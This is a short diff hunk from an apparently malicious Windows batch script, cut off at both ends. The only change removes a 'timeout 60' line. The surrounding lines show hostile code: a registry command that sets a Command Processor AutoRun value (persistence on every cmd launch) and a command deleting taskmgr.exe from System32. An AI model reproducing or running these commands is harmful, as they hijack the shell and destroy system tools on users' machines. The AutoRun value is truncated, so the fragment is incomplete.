@@ -28,7 +28,6 @@ reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%Sy
 
 Del C:\Windows\System32\taskmgr.exe
 
-timeout 60
 
 timeout 60 /nobreak
  
